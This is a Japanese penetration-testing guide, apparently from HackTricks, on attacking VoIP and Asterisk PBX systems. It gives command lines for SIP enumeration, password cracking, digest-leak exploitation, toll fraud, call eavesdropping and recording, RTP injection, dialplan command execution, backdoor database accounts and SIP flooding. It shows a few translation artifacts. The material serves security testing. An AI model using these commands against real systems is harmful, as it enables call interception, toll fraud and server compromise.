# VoIPのペンテスト

<details>

<summary><strong>**htARTE（HackTricks AWS Red Team Expert）**</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>でゼロからヒーローまでAWSハッキングを学びましょう</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksで企業を宣伝したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)で**フォロー**してください。
* **ハッキングテクニックを共有するために、[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。

</details>

## VoIP基本情報

VoIPの動作について学ぶには、以下をチェックしてください:

{% content-ref url="basic-voip-protocols/" %}
[basic-voip-protocols](basic-voip-protocols/)
{% endcontent-ref %}

## 基本メッセージ
```
Request name	Description								RFC references
------------------------------------------------------------------------------------------------------
REGISTER	Register a SIP user.							RFC 3261
INVITE		Initiate a dialog for establishing a call. 				RFC 3261
ACK		Confirm that an entity has received.					RFC 3261
BYE		Signal termination of a dialog and end a call.				RFC 3261
CANCEL		Cancel any pending request.						RFC 3261
UPDATE		Modify the state of a session without changing the state of the dialog.	RFC 3311
REFER		Ask recipient to issue a request for the purpose of call transfer.	RFC 3515
PRACK		Provisional acknowledgement.						RFC 3262
SUBSCRIBE	Initiates a subscription for notification of events from a notifier.	RFC 6665
NOTIFY		Inform a subscriber of notifications of a new event.			RFC 6665
PUBLISH		Publish an event to a notification server.				RFC 3903
MESSAGE		Deliver a text message.	Used in instant messaging applications.		RFC 3428
INFO		Send mid-session information that does not modify the session state.	RFC 6086
OPTIONS		Query the capabilities of an endpoint					RFC 3261
```
## レスポンスコード

**1xx—仮のレスポンス**
```
100 Trying
180 Ringing
181 Call is Being Forwarded
182 Queued
183 Session Progress
199 Early Dialog Terminated
```
**2xx—成功したレスポンス**
```
200 OK
202 Accepted
204 No Notification
```
**3xx—リダイレクトレスポンス**
```
300 Multiple Choices
301 Moved Permanently
302 Moved Temporarily
305 Use Proxy
380 Alternative Service
```
**4xx—クライアントエラーレスポンス**
```
400 Bad Request
401 Unauthorized
402 Payment Required
403 Forbidden
404 Not Found
405 Method Not Allowed
406 Not Acceptable
407 Proxy Authentication Required
408 Request Timeout
409 Conflict
410 Gone
411 Length Required
412 Conditional Request Failed
413 Request Entity Too Large
414 Request-URI Too Long
415 Unsupported Media Type
416 Unsupported URI Scheme
417 Unknown Resource-Priority
420 Bad Extension
421 Extension Required
422 Session Interval Too Small
423 Interval Too Brief
424 Bad Location Information
425 Bad Alert Message
428 Use Identity Header
429 Provide Referrer Identity
430 Flow Failed
433 Anonymity Disallowed
436 Bad Identity-Info
437 Unsupported Certificate
438 Invalid Identity Header
439 First Hop Lacks Outbound Support
440 Max-Breadth Exceeded
469 Bad Info Package
470 Consent Needed
480 Temporarily Unavailable
481 Call/Transaction Does Not Exist
482 Loop Detected
483 Too Many Hops
484 Address Incomplete
485 Ambiguous
486 Busy Here
487 Request Terminated
488 Not Acceptable Here
489 Bad Event
491 Request Pending
493 Undecipherable
494 Security Agreement Required
```
**5xx—サーバーの障害応答**
```
500 Internal Server Error
501 Not Implemented
502 Bad Gateway
503 Service Unavailable
504 Server Time-out
505 Version Not Supported
513 Message Too Large
555 Push Notification Service Not Supported
580 Precondition Failure
```
**6xx—グローバル障害応答**
```
600 Busy Everywhere
603 Decline
604 Does Not Exist Anywhere
606 Not Acceptable
607 Unwanted
608 Rejected
```
## VoIP 列挙

### 電話番号

Red Team が取るべき最初のステップの1つは、OSINT ツール、Google 検索、または Web ページをスクレイピングして企業と連絡を取るための利用可能な電話番号を検索することです。

電話番号を取得したら、オペレーターを特定するためにオンラインサービスを使用できます:

- [https://www.numberingplans.com/?page=analysis\&sub=phonenr](https://www.numberingplans.com/?page=analysis\&sub=phonenr)
- [https://mobilenumbertracker.com/](https://mobilenumbertracker.com/)
- [https://www.whitepages.com/](https://www.whitepages.com/)
- [https://www.twilio.com/lookup](https://www.twilio.com/lookup)

オペレーターが VoIP サービスを提供しているかどうかを知ることで、企業が VoIP を使用しているかどうかを特定できます... さらに、企業が VoIP サービスを雇っていないかもしれませんが、PSTN カードを使用して自社の VoIP PBX を従来の電話ネットワークに接続している可能性があります。

音楽の自動応答などのことは、通常 VoIP が使用されていることを示しています。

### Google Dorks
```bash
# Grandstream phones
intitle:"Grandstream Device Configuration" Password
intitle:"Grandstream Device Configuration" (intext:password & intext:"Grandstream Device Configuration" & intext:"Grandstream Networks" | inurl:cgi-bin) -.com|org

# Cisco Callmanager
inurl:"ccmuser/logon.asp"
intitle:"Cisco CallManager User Options Log On" "Please enter your User ID and Password in the spaces provided below and click the Log On button"

# Cisco phones
inurl:"NetworkConfiguration" cisco

# Linksys phones
intitle:"Sipura SPA Configuration"

# Snom phones
intitle:"snom" intext:"Welcome to Your Phone!" inurl:line_login.htm

# Polycom SoundPoint IP & phones
intitle:"SoundPoint IP Configuration Utility - Registration"
"Welcome to Polycom Web Configuration Utility" "Login as" "Password"
intext: "Welcome to Polycom Web Configuration Utility" intitle:"Polycom - Configuration Utility" inurl:"coreConf.htm"
intitle:"Polycom Login" inurl:"/login.html"
intitle:"Polycom Login" -.com

# Elastix
intitle:"Elastix - Login page" intext:"Elastix is licensed under GPL"

# FreePBX
inurl:"maint/index.php?FreePBX" intitle: "FreePBX" intext:"FreePBX Admministration"
```
### OSINT情報

VoIPソフトウェアの特定に役立つその他のOSINT列挙は、Red Teamにとって有益です。

### ネットワーク列挙

- **`nmap`** はUDPサービスをスキャンすることができますが、スキャンされるUDPサービスの数が多いため、この種のサービスでは非常に遅く、正確ではないかもしれません。
```bash
sudo nmap --script=sip-methods -sU -p 5060 10.10.0.0/24
```
* **`svmap`** SIPViciousから（`sudo apt install sipvicious`）：指定されたネットワーク内のSIPサービスを特定します。
* `svmap`はUser-Agent `friendly-scanner`を使用するため、**簡単にブロック**できますが、`/usr/share/sipvicious/sipvicious`からコードを変更することができます。
```bash
# Use --fp to fingerprint the services
svmap 10.10.0.0/24 -p 5060-5070 [--fp]
```
* **`SIPPTS scan`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTSスキャンは、UDP、TCP、またはTLSを介したSIPサービスの非常に高速なスキャナーです。マルチスレッドを使用し、大きなネットワーク範囲をスキャンできます。ポート範囲を簡単に指定したり、TCPとUDPの両方をスキャンしたり、別のメソッドを使用したり（デフォルトではOPTIONSを使用します）、異なるUser-Agentを指定したりできます。
```bash
sippts scan -i 10.10.0.0/24 -p all -r 5060-5080 -th 200 -ua Cisco [-m REGISTER]

[!] IP/Network: 10.10.0.0/24
[!] Port range: 5060-5080
[!] Protocol: UDP, TCP, TLS
[!] Method to scan: REGISTER
[!] Customized User-Agent: Cisco
[!] Used threads: 200
```
* **metasploit**:  

Metasploit（メタスプロイト）:
```
auxiliary/scanner/sip/options_tcp normal  No     SIP Endpoint Scanner (TCP)
auxiliary/scanner/sip/options     normal  No     SIP Endpoint Scanner (UDP)
```
#### 追加のネットワーク列挙

PBXは他のネットワークサービスも公開している可能性があります:

- **69/UDP (TFTP)**: ファームウェアの更新
- **80 (HTTP) / 443 (HTTPS)**: ウェブからデバイスを管理するため
- **389 (LDAP)**: ユーザー情報を保存するための代替手段
- **3306 (MySQL)**: MySQLデータベース
- **5038 (Manager)**: 他のプラットフォームからAsteriskを使用することを可能にします
- **5222 (XMPP)**: Jabberを使用したメッセージ
- **5432 (PostgreSQL)**: PostgreSQLデータベース
- その他...

### メソッドの列挙

`SIPPTS enumerate`を使用して、PBXで使用可能な**メソッドを見つける**ことができます。[**sippts**](https://github.com/Pepelux/sippts)
```bash
sippts enumerate -i 10.10.0.10
```
### サーバーの応答の分析

サーバーが私たちに送り返すヘッダーを分析することは非常に重要です。私たちが送信するメッセージの種類やヘッダーに応じて。[**sippts**](https://github.com/Pepelux/sippts)の`SIPPTS send`を使用すると、すべてのヘッダーを操作して応答を分析することができます。
```bash
sippts send -i 10.10.0.10 -m INVITE -ua Grandstream -fu 200 -fn Bob -fd 11.0.0.1 -tu 201 -fn Alice -td 11.0.0.2 -header "Allow-Events: presence" -sdp
```
以下は、ネットワークサービスの侵入テストに関するファイルnetwork-services-pentesting/pentesting-voip/README.mdからのコンテンツです。サーバーがWebsocketsを使用している場合、データを取得することも可能です。[**sippts**](https://github.com/Pepelux/sippts)から`SIPPTS wssend`を使用すると、個別のWSメッセージを送信できます。
```bash
sippts wssend -i 10.10.0.10 -r 443 -path /ws
```
### 拡張機能の列挙

PBX（プライベートブランチ交換）システム内の拡張機能は、組織やビジネス内の個々の電話回線、デバイス、またはユーザーに割り当てられた**一意の内部識別子**を指します。拡張機能により、**組織内で効率的に通話をルーティング**することが可能となり、各ユーザーやデバイスに個別の外部電話番号が必要なくなります。

* **`svwar`** from SIPVicious (`sudo apt install sipvicious`): `svwar`は無料のSIP PBX拡張機能ラインスキャナーです。概念的には、**一連の拡張機能または指定された拡張機能のリストを推測**することで、従来のウォーダイヤラーと同様に機能します。
```bash
svwar 10.10.0.10 -p5060 -e100-300 -m REGISTER
```
* **`SIPPTS exten`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS extenはSIPサーバー上の拡張機能を識別します。Sipextenは大規模なネットワークおよびポート範囲をチェックできます。
```bash
sippts exten -i 10.10.0.10 -r 5060 -e 100-200
```
* **metasploit**: Metasploitを使用して拡張子/ユーザー名を列挙することもできます：
```
auxiliary/scanner/sip/enumerator_tcp  normal  No     SIP Username Enumerator (TCP)
auxiliary/scanner/sip/enumerator      normal  No     SIP Username Enumerator (UDP)
```
* **`enumiax` (`apt install enumiax`): enumIAX** は、Inter Asterisk Exchange プロトコルの **ユーザー名ブルートフォース列挙子** です。enumIAX には、2つの異なるモードで動作することがあります。それは、Sequential Username Guessing または Dictionary Attack です。
```bash
enumiax -d /usr/share/wordlists/metasploit/unix_users.txt 10.10.0.10 # Use dictionary
enumiax -v -m3 -M3 10.10.0.10
```
## VoIP 攻撃

### パスワードブルートフォース - オンライン

**PBX** といくつかの **拡張子/ユーザー名** を発見した後、Red Team は一般的なパスワードの辞書を使用して認証をブルートフォースするために **`REGISTER` メソッド** を使用して拡張子に認証を試みることができます。

{% hint style="danger" %}
**ユーザー名** が拡張子と同じである場合がありますが、これは PBX システム、その構成、および組織の設定によって異なる場合があります...

ユーザー名が拡張子と異なる場合は、**ユーザー名を特定してブルートフォースする必要があります**。
{% endhint %}

* SIPVicious の **`svcrack`** (`sudo apt install sipvicious`)：SVCrack を使用すると、PBX 上の特定のユーザー名/拡張子のパスワードをクラックすることができます。
```bash
svcrack -u100 -d dictionary.txt udp://10.0.0.1:5080 #Crack known username
svcrack -u100 -r1-9999 -z4 10.0.0.1 #Check username in extensions
```
* **`SIPPTS rcrack`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rcrackは、SIPサービス用のリモートパスワードクラッカーです。Rcrackは、異なるIPアドレスとポート範囲の複数のユーザーのパスワードをテストできます。
```bash
sippts rcrack -i 10.10.0.10 -e 100,101,103-105 -w wordlist/rockyou.txt
```
### VoIPスニッフィング

**Metasploit**:
* [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb)
* [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack\_tcp.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack\_tcp.rb)

**オープンWifiネットワーク**内でVoIP機器を見つけた場合、**すべての情報をスニッフィング**できます。さらに、より閉じたネットワーク内にいる場合（Ethernet経由で接続されているか、保護されたWifiに接続されている場合）、**ARPスプーフィング**などの**MitM攻撃**を実行して、**PBXとゲートウェイ**間で情報をスニッフィングすることができます。

ネットワーク情報の中には、**機器を管理するためのWeb資格情報**、ユーザー**拡張機能**、**ユーザー名**、**IP**アドレス、さらには**ハッシュ化されたパスワード**や**会話を聞くために再生できるRTPパケット**などが含まれています。

この情報を取得するためには、Wireshark、tcpdumpなどのツールを使用できますが、VoIP会話をスニッフィングするために**特別に作成されたツール**である[**ucsniff**](https://github.com/Seabreg/ucsniff)を使用することもできます。

{% hint style="danger" %}
**SIP通信でTLSが使用されている場合**、SIP通信を平文で表示することはできません。\
同様に、**SRTP**および**ZRTP**が使用されている場合、**RTPパケットは平文では表示されません**。
{% endhint %}

#### SIP資格情報（オフラインでのパスワードブルートフォース）

**SIP REGISTER通信**の**理解を深めるための例**を[こちらで確認してください](basic-voip-protocols/sip-session-initiation-protocol.md#sip-register-example)。これにより、SIPプロトコル内の**ダイジェスト認証**を**pcap**から**抽出**し、**ブルートフォース**することができる**`sipdump`**および**`sipcrack`**（**sipcrack**の一部）が含まれています（`apt-get install sipcrack`）。
```bash
sipdump -p net-capture.pcap sip-creds.txt
sipcrack sip-creds.txt -w dict.txt
```
* **`SIPPTS dump`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS dumpは、pcapファイルからダイジェスト認証を抽出することができます。
```bash
sippts dump -f capture.pcap -o data.txt
```
* **`SIPPTS dcrack`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS dcrackは、SIPPTSのダンプで取得したダイジェスト認証をクラックするためのツールです。
```bash
sippts dcrack -f data.txt -w wordlist/rockyou.txt
```
* **`SIPPTS tshark`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS tsharkは、PCAPファイルからSIPプロトコルのデータを抽出します。
```bash
sippts tshark -f capture.pcap [-filter auth]
```
#### DTMFコード

ネットワークトラフィック中には、**SIP資格情報だけでなく**、**ボイスメール**にアクセスするために使用されるDTMFコードも見つけることができます。\
これらのコードは、**INFO SIPメッセージ**、**オーディオ**、または**RTPパケット**の中に送信することが可能です。RTPパケット内にコードが含まれている場合、会話のその部分を切り取り、ツールmultimoを使用してそれらを抽出することができます：
```bash
multimon -a DTMF -t wac pin.wav
```
### 無料通話 / Asterisks接続の設定ミス

Asteriskでは、特定のIPアドレスからの接続または任意のIPアドレスからの接続を許可することが可能です：
```
host=10.10.10.10
host=dynamic
```
もしIPアドレスが指定されている場合、ホストは定期的にREGISTERリクエストを送信する必要はありません（通常、REGISTERパケットには有効期限が含まれ、通常は30分であり、別のシナリオでは電話は30分ごとにREGISTERする必要があります）。ただし、VoIPサーバーからの通話を受け入れるための接続を許可するオープンポートを持っている必要があります。

ユーザーを定義するためには、次のように定義できます：

- **`type=user`**：ユーザーはユーザーとしてのみ通話を受け取ることができます。
- **`type=friend`**：ピアとして通話を行い、ユーザーとして受け取ることができます（拡張機能と共に使用されます）。
- **`type=peer`**：ピアとして通話を送受信することができます（SIPトランク）。

また、次のように安全でない変数を使用して信頼を確立することも可能です：

- **`insecure=port`**：IPによって検証されたピア接続を許可します。
- **`insecure=invite`**：INVITEメッセージの認証を必要としません。
- **`insecure=port,invite`**：両方

{% hint style="warning" %}
**`type=friend`**が使用される場合、**ホスト**変数の**値**は使用されませんので、管理者がその値を使用してSIPトランクを誤構成した場合、**誰でもそれに接続できる**可能性があります。

たとえば、次の構成は脆弱です：\
`host=10.10.10.10`\
`insecure=port,invite`\
`type=friend`
{% endhint %}

### 無料通話 / Asteriskコンテキストの誤構成

Asteriskでは、**コンテキスト**はダイヤルプラン内の関連する拡張機能、アクション、およびルールを**グループ化する名前付きコンテナまたはセクション**です。ダイヤルプランはAsteriskシステムの中核コンポーネントであり、**着信および発信通話の処理とルーティング方法**を定義します。コンテキストはダイヤルプランを整理し、アクセス制御を管理し、システムの異なる部分を分離するために使用されます。

各コンテキストは通常、**`extensions.conf`**ファイル内で定義されます。コンテキストは角かっこで囲まれ、その中にコンテキスト名が含まれています。例：
```bash
csharpCopy code[my_context]
```
コンテキスト内では、拡張機能（ダイヤル番号のパターン）を定義し、それらを一連のアクションやアプリケーションに関連付けます。これらのアクションは、通話の処理方法を決定します。例えば:
```scss
[my_context]
exten => 100,1,Answer()
exten => 100,n,Playback(welcome)
exten => 100,n,Hangup()
```
この例では、拡張機能「100」を持つ「my\_context」という単純なコンテキストが示されています。誰かが100をダイヤルすると、通話が受けられ、ウェルカムメッセージが再生され、その後通話が終了します。

これは**別のコンテキスト**で、**他の番号に発信できる**ようにします：
```scss
[external]
exten => _X.,1,Dial(SIP/trunk/${EXTEN})
```
もし管理者が**デフォルトコンテキスト**を以下のように定義した場合:
```
[default]
include => my_context
include => external
```
{% hint style="warning" %}
誰でも**サーバーを使用して他の番号に電話をかける**ことができます（サーバーの管理者が通話料を支払います）。
{% endhint %}

{% hint style="danger" %}
さらに、デフォルトでは**`sip.conf`**ファイルには**`allowguest=true`**が含まれており、そのため**認証なし**の**どんな**攻撃者でも他の番号に電話をかけることができます。
{% endhint %}

*   [**sippts**](https://github.com/Pepelux/sippts)**:** **`SIPPTS invite`**は、PBXサーバーが**認証なしで通話を許可するかどうか**をチェックします。 SIPサーバーが誤った構成を持っている場合、外部番号に電話をかけることができます。また、通話を第二の外部番号に転送することもできます。

たとえば、Asteriskサーバーのコンテキスト構成が悪い場合、AUTHORIZATIONなしでINVITEリクエストを受け入れることができます。この場合、攻撃者はユーザー名やパスワードを知らなくても電話をかけることができます。

{% code overflow="wrap" %}
```bash
# Trying to make a call to the number 555555555 (without auth) with source number 200.
sippts invite -i  10.10.0.10 -fu 200 -tu 555555555 -v

# Trying to make a call to the number 555555555 (without auth) and transfer it to number 444444444.
sippts invite -i 10.10.0.10 -tu 555555555 -t 444444444
```
{% endcode %}

### 無料通話 / 設定ミスの IVRS

IVRS は **Interactive Voice Response System** の略で、音声やタッチトーン入力を通じてコンピュータ化されたシステムとやり取りするための電話技術です。 IVRS は情報提供、通話のルーティング、ユーザー入力の収集など、さまざまな機能を提供する **自動通話処理** システムを構築するために使用されます。

VoIP システムの IVRS は通常、以下の要素で構成されています：

1. **音声プロンプト**：ユーザーを IVR メニューオプションと手順に案内する事前録音された音声メッセージ。
2. **DTMF** (Dual-Tone Multi-Frequency) シグナリング：電話のキーを押すことで生成されるタッチトーン入力で、IVR メニューをナビゲートし、入力を提供するために使用されます。
3. **通話ルーティング**：ユーザー入力に基づいて、特定の部署、エージェント、または拡張機能など、適切な宛先に通話を誘導します。
4. **ユーザー入力の収集**：口座番号、ケース ID、またはその他の関連データなど、発信者から情報を収集します。
5. **外部システムとの統合**：IVR システムをデータベースや他のソフトウェアシステムに接続して情報のアクセスや更新、アクションの実行、イベントのトリガーを行います。

Asterisk VoIP システムでは、**`extensions.conf`** ファイルなどのダイヤルプランと `Background()`、`Playback()`、`Read()` などのさまざまなアプリケーションを使用して IVR を作成できます。これらのアプリケーションは、音声プロンプトの再生、ユーザー入力の収集、通話フローの制御を支援します。

#### 脆弱な構成の例
```scss
exten => 0,100,Read(numbers,the_call,,,,5)
exten => 0,101,GotoIf("$[${numbers}"="1"]?200)
exten => 0,102,GotoIf("$[${numbers}"="2"]?300)
exten => 0,103,GotoIf("$[${numbers}"=""]?100)
exten => 0,104,Dial(LOCAL/${numbers})
```
前述は、ユーザーに対して、**1を押して部署に電話をかける**、**2を押して**別の部署に電話をかける、または**完全な内線番号**を知っている場合に入力するよう求める例です。\
脆弱性は、指定された**内線番号の長さがチェックされていないため、ユーザーが5秒のタイムアウト内に完全な番号を入力すると、その番号に電話がかかってしまう**という点です。

### 内線番号インジェクション

次のような内線番号を使用します：
```scss
exten => _X.,1,Dial(SIP/${EXTEN})
```
次に、**`${EXTEN}`** が呼び出される**内線**で、**ext 101 が入力された**場合、次のようになります：
```scss
exten => 101,1,Dial(SIP/101)
```
しかし、もし**`${EXTEN}`**が数字以外を許可する場合（古いAsteriskバージョンのように）、攻撃者は**`101&SIP123123123`**を導入して電話番号123123123に電話をかけることができます。そして、その結果は次のようになります：
```scss
exten => 101&SIP123123123,1,Dial(SIP/101&SIP123123123)
```
したがって、**`101`** と **`123123123`** の拡張子への通話が送信され、通話を受けた最初のものだけが確立されます...しかし、**一致をバイパスする拡張子**を使用する攻撃者が存在しないが実行されている場合、**望ましい番号にのみ通話を注入**することができます。

## SIPDigestLeak脆弱性

SIP Digest Leakは、ハードウェアおよびソフトウェアIP電話機、および電話アダプタ（VoIPからアナログへ）を含む多数のSIP電話機に影響を与える脆弱性です。この脆弱性により、パスワードから計算されるDigest認証応答が**漏洩**します。その後、**オフラインパスワード攻撃**が可能となり、チャレンジレスポンスに基づいてほとんどのパスワードを回復できます。

**[ここからの脆弱性シナリオ**](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf):

1. IP電話機（被害者）が任意のポート（例: 5060）でリスニングし、電話を受け入れる
2. 攻撃者がIP電話機にINVITEを送信
3. 被害者電話機が鳴り始め、誰かが電話に出て切る（他の端末で電話に出ないため）
4. 電話が切られると、**被害者電話機は攻撃者にBYEを送信**
5. **攻撃者は407レスポンスを発行**し、**認証を要求**し、認証チャレンジを発行
6. **被害者電話機は、2番目のBYEで認証チャレンジに応答**を提供
7. **攻撃者は、ローカルマシン（または分散ネットワークなど）でチャレンジレスポンスに対する総当たり攻撃**を実行し、パスワードを推測できます

* **SIPPTS leak** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS leakは、多数のSIP電話機に影響を与えるSIP Digest Leak脆弱性を悪用します。出力はSipCrack形式で保存され、SIPPTS dcrackまたはSipCrackツールを使用して総当たり攻撃を行うことができます。
```bash
sippts leak -i 10.10.0.10

[!] Target: 10.10.0.10:5060/UDP
[!] Caller: 100
[!] Callee: 100

[=>] Request INVITE
[<=] Response 100 Trying
[<=] Response 180 Ringing
[<=] Response 200 OK
[=>] Request ACK
... waiting for BYE ...
[<=] Received BYE
[=>] Request 407 Proxy Authentication Required
[<=] Received BYE with digest
[=>] Request 200 Ok

Auth=Digest username="pepelux", realm="asterisk", nonce="lcwnqoz0", uri="sip:100@10.10.0.10:56583;transport=UDP", response="31fece0d4ff6fd524c1d4c9482e99bb2", algorithm=MD5
```
### Click2Call

Click2Callは、例えば製品に興味を持っている**Webユーザー**が**電話番号**を入力して電話を受けることを可能にします。その後、商用が呼び出され、ユーザーが**電話に出ると**エージェントと**接続されて呼び出されます**。

これに対する一般的なAsteriskプロファイルは次のとおりです：
```scss
[web_user]
secret = complex_password
deny = 0.0.0.0/0.0.0.0
allow = 0.0.0.0/0.0.0.0
displayconnects = yes
read = system,call,log,verbose,agent,user,config,dtmf,reporting,crd,diapla
write = system,call,agent,user,config,command,reporting,originate
```
* 前のプロファイルでは、**パスワードがわかっていればどんなIPアドレスでも接続できる**ようになっています。
* 前述のように、**通話を組織する**には、**読み取り権限は必要ありません**。**書き込み**で**発信**だけが必要です。

これらの権限があれば、パスワードを知っている任意のIPが接続して、情報を抽出することができます。
```bash
# Get all the peers
exec 3<>/dev/tcp/10.10.10.10/5038 && echo -e "Action: Login\nUsername:test\nSecret:password\nEvents: off\n\nAction:Command\nCommand: sip show peers\n\nAction: logoff\n\n">&3 && cat <&3
```
{% endcode %}

**追加の情報やアクションが要求される可能性があります。**

### **盗聴**

Asteriskでは、**`ChanSpy`** コマンドを使用して、監視する**内線**（またはすべての内線）を指定して、発生している会話を聞くことが可能です。このコマンドは内線に割り当てる必要があります。

例えば、**`exten => 333,1,ChanSpy('all',qb)`** は、内線333に**電話をかける**と、**すべて**の内線を**監視**し、新しい会話が始まるとすぐに（**`b`**）**静かなモード**（**`q`**）で聞き始めることを示します。会話を聞く代わりに、**`*`** を押すか、内線番号をマークすることで、別の会話に移ることができます。

また、**`ExtenSpy`** を使用して、1つの内線のみを監視することも可能です。

会話を聞く代わりに、**ファイルに記録する**ことも可能で、次のような内線を使用します：

{% code overflow="wrap" %}
```scss
[recorded-context]
exten => _X.,1,Set(NAME=/tmp/${CONTEXT}_${EXTEN}_${CALLERID(num)}_${UNIQUEID}.wav)
exten => _X.,2,MixMonitor(${NAME})
```
{% endcode %}

通話は**`/tmp`**に保存されます。

Asteriskが閉じられると、通話内容を**漏洩**するスクリプトを実行させることさえできます。
```scss
exten => h,1,System(/tmp/leak_conv.sh &)
```
### RTCPBleed脆弱性

**RTCPBleed**は、2017年に公開されたAsteriskベースのVoIPサーバーに影響を与える重大なセキュリティ問題です。この脆弱性により、VoIP会話を運ぶ**RTP（Real Time Protocol）トラフィック**が、インターネット上の誰でもによって**傍受およびリダイレクト**される可能性があります。これは、RTPトラフィックがNAT（Network Address Translation）ファイアウォールを経由する際に認証をバイパスするために発生します。

RTPプロキシは、RTCシステムに影響を与える**NATの制限**に対処するために、2つ以上のパーティー間でRTPストリームをプロキシングすることを試みます。NATが存在する場合、RTPプロキシソフトウェアは、通信（例：SIP）を介して取得したRTP IPおよびポート情報に依存できないことがよくあります。そのため、多くのRTPプロキシは、そのような**IPおよびポートの組み合わせが自動的に学習される**メカニズムを実装しています。これは、着信RTPトラフィックを検査し、着信RTPトラフィックのソースIPおよびポートを応答すべきものとしてマークすることによってしばしば行われます。このメカニズムは通常、「学習モード」と呼ばれ、**いかなる種類の認証も使用しません**。したがって、**攻撃者**は**RTPトラフィックをRTPプロキシに送信**し、進行中のRTPストリームの発信者または呼び出し先向けに意図されたプロキシされたRTPトラフィックを受信することができます。これをRTP Bleedと呼び、攻撃者が正規のユーザーに送信されるはずのRTPメディアストリームを受信できるようにします。

RTPプロキシとRTPスタックのもう1つの興味深い動作は、**RTP Bleedに脆弱でなくても**、**任意のソースからのRTPパケットを受け入れ、転送、および/または処理する**ことがあることです。したがって、攻撃者は正規のものの代わりに自分のメディアを注入することができるRTPパケットを送信できます。これをRTPインジェクション攻撃と呼び、既存のRTPストリームに不正なRTPパケットを注入することができます。この脆弱性は、RTPプロキシとエンドポイントの両方で見つかる可能性があります。

AsteriskとFreePBXは、従来、**`NAT=yes`設定**を使用しており、RTPトラフィックが認証をバイパスすることを可能にし、通話で音声がないか片方向の音声になる可能性があります。

詳細については、[https://www.rtpbleed.com/](https://www.rtpbleed.com/)を参照してください。

* **`SIPPTS rtpbleed`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtpbleedは、RTP Bleed脆弱性を検出し、RTPストリームを送信します。
```bash
sippts rtpbleed -i 10.10.0.10
```
* **`SIPPTS rtcpbleed`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtcpbleedは、RTCPストリームを送信してRTP Bleed脆弱性を検出します。
```bash
sippts rtcpbleed -i 10.10.0.10
```
* **`SIPPTS rtpbleedflood`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtpbleedfloodは、RTPストリームを送信するRTP Bleed脆弱性を悪用します。
```bash
sippts rtpbleedflood -i 10.10.0.10 -p 10070 -v
```
* **`SIPPTS rtpbleedinject`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtpbleedinjectは、RTP Bleed脆弱性を悪用し、オーディオファイル（WAV形式）を注入します。
```bash
sippts rtpbleedinject -i 10.10.0.10 -p 10070 -f audio.wav
```
### RCE

Asteriskで何らかの方法で**拡張ルールを追加してリロード**することができる場合（例えば脆弱性のあるWebマネージャーサーバーを侵害することで）、**`System`**コマンドを使用してRCEを取得することが可能です。
```scss
same => n,System(echo "Called at $(date)" >> /tmp/call_log.txt)
```
**`Shell`**というコマンドは、必要に応じてシステムコマンドを実行するために**`System`**の代わりに使用できます。

{% hint style="warning" %}
サーバーが**`System`**コマンドで特定の文字の使用を禁止している場合（Elastixなど）、ウェブサーバーがシステム内で何らかの方法でファイルを作成することを許可しているかどうかを確認し（Elastixやtrixboxのように）、それを使用してバックドアスクリプトを作成し、そのスクリプトを実行するために**`System`**を使用します。
{% endhint %}

#### 興味深いローカルファイルと権限

* **`sip.conf`** -> SIPユーザーのパスワードが含まれています。
* **Asteriskサーバーがrootとして実行されている場合**、rootを危険にさらす可能性があります
* **mysql rootユーザー**は**パスワードを持っていない**かもしれません。
* これを使用してバックドアとして新しいmysqlユーザーを作成できます
* **`FreePBX`**
* **`amportal.conf`** -> ウェブパネル管理者（FreePBX）のパスワードが含まれています
* **`FreePBX.conf`** -> データベースにアクセスするために使用されるFreePBXユーザーのパスワードが含まれています
* これを使用してバックドアとして新しいmysqlユーザーを作成できます
* **`Elastix`**
* **`Elastix.conf`** -> mysql rootパスワード、IMAPdパスワード、Web管理者パスワードなど、いくつかのパスワードが平文で含まれています
* **いくつかのフォルダ**は、compromised asteriskユーザーに属します（rootとして実行されていない場合）。このユーザーは前述のファイルを読み取ることができ、また構成を制御しているため、Asteriskが他のバックドア付きバイナリを実行するようにすることができます。

### RTPインジェクション

**`rtpinsertsound`**（`sudo apt install rtpinsertsound`）や**`rtpmixsound`**（`sudo apt install rtpmixsound`）などのツールを使用して、会話に**`.wav`**を挿入することが可能です。

また、[http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/](http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/)からスクリプトを使用して、会話を**スキャン**する（**`rtpscan.pl`**）、会話に`.wav`を送信する（**`rtpsend.pl`**）、会話に**ノイズを挿入**する（**`rtpflood.pl`**）ことができます。

### DoS

VoIPサーバーでDoSを試みるためのいくつかの方法があります。

* [**sippts**](https://github.com/Pepelux/sippts)からの**`SIPPTS flood`**：SIPPTS floodはターゲットに無制限のメッセージを送信します。
* `sippts flood -i 10.10.0.10 -m invite -v`
